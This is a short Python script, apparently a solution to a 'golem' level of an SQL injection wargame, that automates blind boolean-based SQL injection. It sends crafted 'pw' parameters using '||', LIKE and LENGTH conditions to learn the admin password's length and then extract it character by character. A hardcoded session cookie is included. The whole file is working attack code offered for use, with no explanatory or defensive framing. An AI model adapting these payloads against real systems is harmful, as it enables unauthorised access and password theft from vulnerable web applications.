import requests

url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"


def get_pw_length(cookie):
    cookie_header = {"PHPSESSID": cookie}

    for i in range(1, 20):
        query = "?pw=1' || id LIKE 'admin' %26%26 LENGTH(pw)<{} %23".format(str(i))
        request = url + query

        response = requests.get(request, cookies=cookie_header)
        if response.text.find("<h2>Hello admin</h2>") > 0:
            print(i - 1)
            return i - 1


def injection(cookie, length):
    cookie_header = {"PHPSESSID": cookie}
    result = ""

    char_list = "qwertyuiopasdfghjklzxcvbnmm1234567890"

    for i in range(length + 1):
        for x in char_list:
            query = "?pw=1' || id LIKE 'admin' %26%26 pw LIKE '" + result + x + "%' %23"
            request = url + query

            response = requests.get(request, cookies=cookie_header)
            if response.text.find("<h2>Hello admin</h2>") > 0:
                result += x
                print(result)
                break
    return result

if __name__ == '__main__':
    cookie = "75pktsp7qe21ak9j3k46r7t2v7"
    length = get_pw_length(cookie)
    result = injection(cookie, length)
